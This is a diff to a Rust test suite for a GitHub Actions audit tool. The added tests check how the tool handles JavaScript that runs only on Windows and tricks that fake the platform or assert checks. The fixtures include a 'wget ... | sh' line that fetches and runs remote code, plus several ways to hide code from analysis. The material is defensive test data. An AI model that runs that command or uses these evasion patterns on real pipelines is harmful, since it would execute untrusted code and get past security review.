@@ -341,7 +341,7 @@ jobs:
         .unwrap();
     assert_eq!(output.status.code(), Some(2));
     let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert_eq!(report["rules_version"], 10);
+    assert_eq!(report["rules_version"], 11);
     assert_eq!(report["audited_bundled"], 0);
     assert_eq!(report["external_actions_skipped"], 2);
     assert_eq!(report["coverage_complete"], false);
@@ -6420,5 +6420,691 @@ fn score_does_not_emit_dynamic_javascript_audit_diagnostics() {
     assert_eq!(report["coverage_complete"], false);
     for bytes in [&output.stdout, &output.stderr] {
         assert!(!String::from_utf8_lossy(bytes).contains("dynamic JavaScript evaluation"));
+    }
+}
+
+const WINDOWS_CJS: &str = "const path = require('path');\nconst cp = require('child_process');\nconst assert = require('assert');\n";
+const WINDOWS_RUN: &str = "cp.spawnSync('bash', [path.join(__dirname, 'evil.sh')]);\n";
+const WINDOWS_TEST: &str = "const IS_WINDOWS = process.platform === 'win32';\n";
+const BUNDLED_ASSERT: &str =
+    "  2613: ((module) => {\n    module.exports = require(\"assert\");\n  }),\n";
+const BUNDLER_RUNTIME: &str = "var __webpack_module_cache__ = {};\nfunction __nccwpck_require__(moduleId) {\n  var cachedModule = __webpack_module_cache__[moduleId];\n  if (cachedModule !== undefined) {\n    return cachedModule.exports;\n  }\n  var module = __webpack_module_cache__[moduleId] = { exports: {} };\n  __webpack_modules__[moduleId].call(module.exports, module, module.exports, __nccwpck_require__);\n  return module.exports;\n}\n";
+
+/// An ncc-shaped bundle that takes its built-ins from its module table,
+/// with `runtime` as its require function and `table` as the entry for
+/// `assert`, and runs `evil.sh` after asserting the platform is Windows.
+fn bundled_windows_action(table: &str, runtime: &str, after: &str) -> String {
+    format!(
+        "var __webpack_modules__ = ({{\n{table}  6928: ((module) => {{\n    module.exports = require(\"path\");\n  }}),\n  5317: ((module) => {{\n    module.exports = require(\"child_process\");\n  }})\n}});\n{runtime}const assert_1 = __nccwpck_require__(2613);\nconst path = __nccwpck_require__(6928);\nconst cp = __nccwpck_require__(5317);\n{after}{WINDOWS_TEST}function go() {{\n  (0, assert_1.ok)(IS_WINDOWS, 'unsupported');\n  {WINDOWS_RUN}}}\ngo();\n"
+    )
+}
+
+#[test]
+fn windows_only_javascript_is_outside_location_analysis() {
+    let action = |body: &str| vec![("index.js", format!("{WINDOWS_CJS}{body}"))];
+    let guarded = format!("if (process.platform === 'win32') {{\n{WINDOWS_RUN}}}\n");
+    let asserted = |assertion: &str| {
+        format!("{WINDOWS_TEST}function go() {{\n  {assertion}\n  {WINDOWS_RUN}}}\ngo();\n")
+    };
+    let cases = vec![
+        ("branch on the platform", false, action(&guarded)),
+        (
+            "branch on a variable holding the test",
+            false,
+            action(&format!(
+                "{WINDOWS_TEST}if (IS_WINDOWS) {{\n{WINDOWS_RUN}}}\n"
+            )),
+        ),
+        (
+            "after assert.ok",
+            false,
+            action(&asserted("assert.ok(IS_WINDOWS, 'unsupported');")),
+        ),
+        (
+            "after assert called directly",
+            false,
+            action(&asserted("assert(IS_WINDOWS);")),
+        ),
+        (
+            "after an indirect call",
+            false,
+            action(&asserted("(0, assert.ok)(IS_WINDOWS, 'unsupported');")),
+        ),
+        (
+            "located value assigned in the branch and used after it",
+            false,
+            action(
+                "let script;\nif (process.platform === 'win32') {\n  script = path.join(__dirname, 'evil.sh');\n}\ncp.spawnSync('bash', [script]);\n",
+            ),
+        ),
+        (
+            "located argument to a function that asserts",
+            false,
+            action(&format!(
+                "{WINDOWS_TEST}function go(script) {{\n  assert.ok(IS_WINDOWS, 'unsupported');\n  cp.spawnSync('bash', [script]);\n}}\ngo(path.join(__dirname, 'evil.sh'));\n"
+            )),
+        ),
+        (
+            "ordinary uses of process elsewhere",
+            false,
+            action(&format!(
+                "const {{ env }} = process;\nif (typeof process !== 'undefined' && process.versions) {{ process.env[env.NAME] = 'value'; }}\nconst key = Symbol.for('dispatcher');\nObject.defineProperty(globalThis, key, {{ value: typeof process === 'object' && process ? 1 : 2 }});\n{guarded}"
+            )),
+        ),
+        (
+            "assert loaded through createRequire",
+            true,
+            vec![(
+                "index.js",
+                format!(
+                    "import {{ createRequire as __WEBPACK_EXTERNAL_createRequire }} from \"module\";\nconst cp = __WEBPACK_EXTERNAL_createRequire(import.meta.url)(\"child_process\");\nconst path = __WEBPACK_EXTERNAL_createRequire(import.meta.url)(\"path\");\nconst external_assert_ = __WEBPACK_EXTERNAL_createRequire(import.meta.url)(\"assert\");\n{WINDOWS_TEST}function go() {{\n  (0,external_assert_.ok)(IS_WINDOWS, 'unsupported');\n  cp.spawnSync('bash', [path.join(import.meta.dirname, 'evil.sh')]);\n}}\ngo();\n"
+                ),
+            )],
+        ),
+        (
+            "assert from a bundler's module table",
+            false,
+            vec![(
+                "index.js",
+                bundled_windows_action(BUNDLED_ASSERT, BUNDLER_RUNTIME, ""),
+            )],
+        ),
+        (
+            "ordinary uses of the global object, assert and the names",
+            false,
+            action(&format!(
+                "const browser = typeof window !== 'undefined' && window.process && (window.process.type === 'renderer' || window.process.__nwjs);\nclass Permissions {{\n  constructor() {{ this.process = false; this.platform = 'linux'; }}\n  static parse(like) {{ const permissions = new Permissions(); if (like.process) {{ permissions.process = true; }} return permissions; }}\n}}\nPermissions.parse({{}});\nexports.platform = require('os').platform();\nfunction mark(scope, state) {{ return scope === state; }}\nfunction each(callback, thisArg = globalThis) {{ return callback.call(thisArg); }}\nmark(globalThis, browser);\neach(() => global[process.env.NAME]);\nconst {{ AssertionError }} = assert;\nfunction check(value) {{ assert(value, 'required'); assert.strictEqual(typeof value, 'string'); if (value instanceof AssertionError) {{ throw new assert.AssertionError({{ message: 'no' }}); }} }}\ncheck('a');\n{guarded}{}",
+                asserted("assert.ok(IS_WINDOWS, 'unsupported');")
+            )),
+        ),
+    ];
+    let failures = module_failures(cases, &ModuleOutcome::Clean);
+    assert!(failures.is_empty(), "{failures:#?}");
+}
+
+#[test]
+fn javascript_other_platforms_reach_keeps_its_locations() {
+    let action = |body: &str| vec![("index.js", format!("{WINDOWS_CJS}{body}"))];
+    let cases = vec![
+        ("no guard", false, action(WINDOWS_RUN)),
+        (
+            "other branch of the test",
+            false,
+            action(&format!(
+                "if (process.platform === 'win32') {{\n}} else {{\n{WINDOWS_RUN}}}\n"
+            )),
+        ),
+        (
+            "branch on any other platform",
+            false,
+            action(&format!(
+                "if (process.platform !== 'win32') {{\n{WINDOWS_RUN}}}\n"
+            )),
+        ),
+        (
+            "branch on a named platform that is not Windows",
+            false,
+            action(&format!(
+                "if (process.platform === 'linux') {{\n{WINDOWS_RUN}}}\n"
+            )),
+        ),
+        (
+            "variable that may hold another value",
+            false,
+            action(&format!(
+                "let IS_WINDOWS = process.platform === 'win32';\nIS_WINDOWS = true;\nif (IS_WINDOWS) {{\n{WINDOWS_RUN}}}\n"
+            )),
+        ),
+        (
+            "platform of another object",
+            false,
+            action(&format!(
+                "function go() {{\n  const process = {{ platform: 'win32' }};\n  if (process.platform === 'win32') {{\n{WINDOWS_RUN}  }}\n}}\ngo();\n"
+            )),
+        ),
+        (
+            "assertion of something else",
+            false,
+            action(&format!(
+                "function go(file) {{\n  assert.ok(file, 'required');\n  {WINDOWS_RUN}}}\ngo('a');\n"
+            )),
+        ),
+        (
+            "before the assertion",
+            false,
+            action(&format!(
+                "{WINDOWS_TEST}function go() {{\n  {WINDOWS_RUN}  assert.ok(IS_WINDOWS, 'unsupported');\n}}\ngo();\n"
+            )),
+        ),
+        (
+            "after the block that asserts",
+            false,
+            action(&format!(
+                "{WINDOWS_TEST}function go() {{\n  try {{\n    assert.ok(IS_WINDOWS, 'unsupported');\n  }} catch {{}}\n  {WINDOWS_RUN}}}\ngo();\n"
+            )),
+        ),
+        (
+            "function hoisted above the assertion",
+            false,
+            action(&format!(
+                "{WINDOWS_TEST}function go() {{\n  helper();\n  assert.ok(IS_WINDOWS, 'unsupported');\n  function helper() {{\n    {WINDOWS_RUN}  }}\n}}\ngo();\n"
+            )),
+        ),
+        (
+            "labelled function hoisted above the assertion",
+            false,
+            action(&format!(
+                "{WINDOWS_TEST}function go() {{\n  helper();\n  assert.ok(IS_WINDOWS, 'unsupported');\n  outer: inner: function helper() {{\n    {WINDOWS_RUN}  }}\n}}\ngo();\n"
+            )),
+        ),
+        (
+            "variable declared again with another value",
+            false,
+            action(&format!(
+                "var win = process.platform === 'win32';\nvar win = true;\nif (win) {{\n{WINDOWS_RUN}}}\n"
+            )),
+        ),
+        (
+            "variable assigned the test, then declared with another value",
+            false,
+            action(&format!(
+                "var win;\nwin = process.platform === 'win32';\nvar win = true;\nif (win) {{\n{WINDOWS_RUN}}}\n"
+            )),
+        ),
+        (
+            "process variable declared again",
+            false,
+            action(&format!(
+                "var p = process;\nvar p = {{ platform: 'win32' }};\nif (p.platform === 'win32') {{\n{WINDOWS_RUN}}}\n"
+            )),
+        ),
+        (
+            "variable that may hold another object",
+            false,
+            action(&format!(
+                "const p = process.env.CI ? {{ platform: 'win32' }} : process;\nif (p.platform === 'win32') {{\n{WINDOWS_RUN}}}\n"
+            )),
+        ),
+        (
+            "process property of another object",
+            false,
+            action(&format!(
+                "function go(options) {{\n  if (options.process.platform === 'win32') {{\n{WINDOWS_RUN}  }}\n}}\ngo({{ process: {{ platform: 'win32' }} }});\n"
+            )),
+        ),
+    ];
+    let failures = module_failures(cases, &ModuleOutcome::Followed);
+    assert!(failures.is_empty(), "{failures:#?}");
+}
+
+#[test]
+fn replacing_the_platform_or_assert_withdraws_windows_only_code() {
+    let guarded = format!("if (process.platform === 'win32') {{\n{WINDOWS_RUN}}}\n");
+    let asserted = format!(
+        "{WINDOWS_TEST}function go() {{\n  assert.ok(IS_WINDOWS, 'unsupported');\n  {WINDOWS_RUN}}}\ngo();\n"
+    );
+    let action = |replacement: &str, body: &str| {
+        vec![("index.js", format!("{WINDOWS_CJS}{replacement}\n{body}"))]
+    };
+    let fake = "{ platform: 'win32' }";
+    let bundled = |table: &str, runtime: &str, after: &str| {
+        vec![("index.js", bundled_windows_action(table, runtime, after))]
+    };
+    let cases = vec![
+        (
+            "platform defined",
+            false,
+            action(
+                "Object.defineProperty(process, 'platform', { value: 'win32' });",
+                &guarded,
+            ),
+        ),
+        (
+            "platform defined through a variable",
+            false,
+            action(
+                "const p = process;\nObject.defineProperty(p, 'platform', { value: 'win32' });",
+                &guarded,
+            ),
+        ),
+        (
+            "process passed to a function",
+            false,
+            action(
+                "function patch(object, key) { Object.defineProperty(object, key, { value: 'win32' }); }\npatch(process, 'platform');",
+                &guarded,
+            ),
+        ),
+        (
+            "platform deleted and inherited",
+            false,
+            action(
+                "delete process.platform;\nObject.prototype.platform = 'win32';",
+                &guarded,
+            ),
+        ),
+        (
+            "accessor defined on process",
+            false,
+            action(
+                "process.__defineGetter__('platform', () => 'win32');",
+                &guarded,
+            ),
+        ),
+        (
+            "platform defined by another file",
+            false,
+            vec![
+                (
+                    "index.js",
+                    format!("require('./setup.js');\n{WINDOWS_CJS}{guarded}"),
+                ),
+                (
+                    "setup.js",
+                    "Object.defineProperty(process, 'platform', { value: 'win32' });\n".to_string(),
+                ),
+            ],
+        ),
+        (
+            "global process assigned",
+            false,
+            action(&format!("globalThis.process = {fake};"), &guarded),
+        ),
+        (
+            "global process defined",
+            false,
+            action(
+                &format!("Object.defineProperty(globalThis, 'process', {{ value: {fake} }});"),
+                &guarded,
+            ),
+        ),
+        (
+            "global process set",
+            false,
+            action(
+                &format!("Reflect.set(globalThis, 'process', {fake});"),
+                &guarded,
+            ),
+        ),
+        (
+            "global process copied in",
+            false,
+            action(
+                &format!("Object.assign(globalThis, {{ process: {fake} }});"),
+                &guarded,
+            ),
+        ),
+        (
+            "global stored under an unknown key",
+            false,
+            action(
+                &format!("const key = ['pro', 'cess'].join('');\nglobalThis[key] = {fake};"),
+                &guarded,
+            ),
+        ),
+        (
+            "function that is only named ok",
+            false,
+            action(
+                "function ok() {}",
+                &format!(
+                    "{WINDOWS_TEST}function go() {{\n  ok(IS_WINDOWS);\n  {WINDOWS_RUN}}}\ngo();\n"
+                ),
+            ),
+        ),
+        (
+            "assert.ok replaced",
+            false,
+            action("assert.ok = function () {};", &asserted),
+        ),
+        (
+            "assert variable reassigned",
+            false,
+            vec![(
+                "index.js",
+                format!(
+                    "const path = require('path');\nconst cp = require('child_process');\nlet assert = require('assert');\nassert = {{ ok() {{}} }};\n{asserted}"
+                ),
+            )],
+        ),
+        (
+            "bundled assert.ok replaced",
+            false,
+            bundled(
+                BUNDLED_ASSERT,
+                BUNDLER_RUNTIME,
+                "assert_1.ok = function () {};\n",
+            ),
+        ),
+        (
+            "table entry that is not the built-in",
+            false,
+            bundled(
+                "  2613: ((module) => {\n    module.exports = { ok() {} };\n  }),\n",
+                BUNDLER_RUNTIME,
+                "",
+            ),
+        ),
+        (
+            "table entry replaced",
+            false,
+            bundled(
+                BUNDLED_ASSERT,
+                BUNDLER_RUNTIME,
+                "__webpack_modules__[2613] = (module) => { module.exports = { ok() {} }; };\n",
+            ),
+        ),
+        (
+            "module cache filled in advance",
+            false,
+            bundled(
+                BUNDLED_ASSERT,
+                &format!(
+                    "{BUNDLER_RUNTIME}__webpack_module_cache__[2613] = {{ exports: {{ ok() {{}} }} }};\n"
+                ),
+                "",
+            ),
+        ),
+        (
+            "require function that does not return exports",
+            false,
+            bundled(
+                BUNDLED_ASSERT,
+                "function __nccwpck_require__(moduleId) {\n  if (moduleId === 2613) {\n    return { ok() {} };\n  }\n  if (moduleId === 6928) {\n    return require('path');\n  }\n  return require('child_process');\n}\n",
+                "",
+            ),
+        ),
+        (
+            "require function declared again",
+            false,
+            bundled(
+                BUNDLED_ASSERT,
+                &format!(
+                    "{BUNDLER_RUNTIME}function __nccwpck_require__(moduleId) {{\n  if (moduleId === 2613) {{\n    return {{ ok() {{}} }};\n  }}\n  if (moduleId === 6928) {{\n    return require('path');\n  }}\n  return require('child_process');\n}}\n"
+                ),
+                "",
+            ),
+        ),
+        (
+            "module cache that starts with an entry",
+            false,
+            bundled(
+                BUNDLED_ASSERT,
+                &BUNDLER_RUNTIME.replace(
+                    "var __webpack_module_cache__ = {};",
+                    "var __webpack_module_cache__ = { 2613: { exports: { ok() {} } } };",
+                ),
+                "",
+            ),
+        ),
+        (
+            "global process accessor defined",
+            false,
+            action(
+                &format!("globalThis.__defineGetter__('process', () => ({fake}));"),
+                &guarded,
+            ),
+        ),
+        (
+            "global process defined through a variable",
+            false,
+            action(
+                &format!(
+                    "const define = Object.defineProperty;\ndefine(globalThis, 'process', {{ value: {fake} }});"
+                ),
+                &guarded,
+            ),
+        ),
+        (
+            "global process defined through call",
+            false,
+            action(
+                &format!(
+                    "Object.defineProperty.call(Object, globalThis, 'process', {{ value: {fake} }});"
+                ),
+                &guarded,
+            ),
+        ),
+        (
+            "global process defined through apply",
+            false,
+            action(
+                &format!(
+                    "Object.defineProperty.apply(Object, [globalThis, 'process', {{ value: {fake} }}]);"
+                ),
+                &guarded,
+            ),
+        ),
+        (
+            "global process defined through a destructured function",
+            false,
+            action(
+                &format!(
+                    "const {{ defineProperty: define }} = Object;\ndefine(globalThis, 'process', {{ value: {fake} }});"
+                ),
+                &guarded,
+            ),
+        ),
+        (
+            "global process set through a variable",
+            false,
+            action(
+                &format!("const put = Reflect.set;\nput(globalThis, 'process', {fake});"),
+                &guarded,
+            ),
+        ),
+        (
+            "global process set through a destructured function",
+            false,
+            action(
+                &format!("const {{ set }} = Reflect;\nset(globalThis, 'process', {fake});"),
+                &guarded,
+            ),
+        ),
+        (
+            "global object held by a conditional variable",
+            false,
+            action(
+                &format!(
+                    "var root = typeof globalThis !== 'undefined' ? globalThis : global;\nroot.process = {fake};"
+                ),
+                &guarded,
+            ),
+        ),
+        (
+            "global object reached as this",
+            false,
+            action(
+                &format!("(function () {{ this.process = {fake}; }})();"),
+                &guarded,
+            ),
+        ),
+        (
+            "global object reached through Function",
+            false,
+            action(
+                &format!(
+                    "const key = ['pro', 'cess'].join('');\nFunction('return this')()[key] = {fake};"
+                ),
+                &guarded,
+            ),
+        ),
+        (
+            "process read out of another object",
+            false,
+            action(
+                "function patch(root) {\n  const p = root.process;\n  Object.defineProperty(p, 'platform', { value: 'win32' });\n}\npatch(globalThis);",
+                &guarded,
+            ),
+        ),
+        (
+            "process destructured out of the global object",
+            false,
+            action(
+                "const { process: p } = globalThis;\nObject.defineProperty(p, 'platform', { value: 'win32' });",
+                &guarded,
+            ),
+        ),
+        (
+            "process read out by name through a call",
+            false,
+            action(
+                "const p = Reflect.get(globalThis, 'process');\nObject.defineProperty(p, 'platform', { value: 'win32' });",
+                &guarded,
+            ),
+        ),
+        (
+            "process held by a conditional variable",
+            false,
+            action(
+                "const p = process.env.CI ? process : process;\nObject.defineProperty(p, 'platform', { value: 'win32' });",
+                &guarded,
+            ),
+        ),
+        (
+            "with statement",
+            false,
+            action(
+                "",
+                &format!("with ({{ process: {fake} }}) {{\n  {guarded}}}\n"),
+            ),
+        ),
+        (
+            "assert accessor defined",
+            false,
+            action(
+                "assert.__defineGetter__('ok', () => function () {});",
+                &asserted,
+            ),
+        ),
+        (
+            "assert.ok deleted and inherited",
+            false,
+            action(
+                "delete assert.ok;\nObject.prototype.ok = function () {};",
+                &asserted,
+            ),
+        ),
+        (
+            "assert.ok replaced through a pattern",
+            false,
+            action("({ ok: assert.ok } = { ok() {} });", &asserted),
+        ),
+        (
+            "assert.default replaced",
+            false,
+            action(
+                "assert.default = { ok() {} };",
+                &asserted.replace("assert.ok(", "assert.default.ok("),
+            ),
+        ),
+        (
+            "assert variable declared again",
+            false,
+            vec![(
+                "index.js",
+                format!(
+                    "const path = require('path');\nconst cp = require('child_process');\nvar assert = require('assert');\nvar assert = {{ ok() {{}} }};\n{asserted}"
+                ),
+            )],
+        ),
+        (
+            "assert kept where it is not followed",
+            false,
+            action(
+                "const held = [assert];\nheld[0].ok = function () {};",
+                &asserted,
+            ),
+        ),
+        (
+            "assert handed to another file",
+            false,
+            vec![
+                (
+                    "index.js",
+                    format!("{WINDOWS_CJS}require('./lib.js').patch(assert);\n{asserted}"),
+                ),
+                (
+                    "lib.js",
+                    "exports.patch = (module) => { module.ok = function () {}; };\n".to_string(),
+                ),
+            ],
+        ),
+    ];
+    let failures = module_failures(cases, &ModuleOutcome::Followed);
+    assert!(failures.is_empty(), "{failures:#?}");
+}
+
+#[test]
+fn inline_step_code_withdraws_windows_only_code_from_what_it_loads() {
+    let guarded = format!("{WINDOWS_CJS}if (process.platform === 'win32') {{\n{WINDOWS_RUN}}}\n");
+    let asserted = format!(
+        "{WINDOWS_CJS}{WINDOWS_TEST}function go() {{\n  assert.ok(IS_WINDOWS, 'unsupported');\n  {WINDOWS_RUN}}}\ngo();\n"
+    );
+    let load = "require('${{ github.action_path }}/index.js');";
+    for (inline, helper, followed) in [
+        (
+            "Object.defineProperty(process, 'platform', { value: 'win32' });",
+            &guarded,
+            true,
+        ),
+        ("require('assert').ok = function () {};", &asserted, true),
+        ("", &guarded, false),
+        ("", &asserted, false),
+    ] {
+        let action = format!(
+            "name: local\ndescription: local\nruns:\n  using: composite\n  steps:\n    - shell: node {{0}}\n      run: |\n        {inline}\n        {load}\n"
+        );
+        let (code, report) = audit_local_action(
+            &action,
+            &[
+                ("index.js", helper),
+                ("evil.sh", "wget -qO- https://example.com/evil.sh | sh\n"),
+            ],
+        );
+        assert_eq!(report["coverage_complete"], true, "{inline}: {report}");
+        assert_eq!(code, Some(i32::from(followed)), "{inline}: {report}");
+        assert_eq!(
+            report["findings"].as_array().unwrap().len(),
+            usize::from(followed),
+            "{inline}: {report}"
+        );
+    }
+}
+
+#[test]
+fn node_options_withdraw_windows_only_code_from_the_action() {
+    let helper = format!("{WINDOWS_CJS}if (process.platform === 'win32') {{\n{WINDOWS_RUN}}}\n");
+    let run = "node \"${{ github.action_path }}/index.js\"";
+    for (step, followed) in [
+        (
+            format!(
+                "    - shell: bash\n      env:\n        NODE_OPTIONS: --require ${{{{ github.action_path }}}}/patch.js\n      run: {run}\n"
+            ),
+            true,
+        ),
+        (
+            format!(
+                "    - shell: bash\n      run: echo \"NODE_OPTIONS=--require $GITHUB_ACTION_PATH/patch.js\" >> \"$GITHUB_ENV\"\n    - shell: bash\n      run: {run}\n"
+            ),
+            true,
+        ),
+        (format!("    - shell: bash\n      run: {run}\n"), false),
+    ] {
+        let action =
+            format!("name: local\ndescription: local\nruns:\n  using: composite\n  steps:\n{step}");
+        let (code, report) = audit_local_action(
+            &action,
+            &[
+                ("index.js", &helper),
+                (
+                    "patch.js",
+                    "Object.defineProperty(process, 'platform', { value: 'win32' });\n",
+                ),
+                ("evil.sh", "wget -qO- https://example.com/evil.sh | sh\n"),
+            ],
+        );
+        assert_eq!(report["coverage_complete"], true, "{step}: {report}");
+        assert_eq!(code, Some(i32::from(followed)), "{step}: {report}");
     }
 }
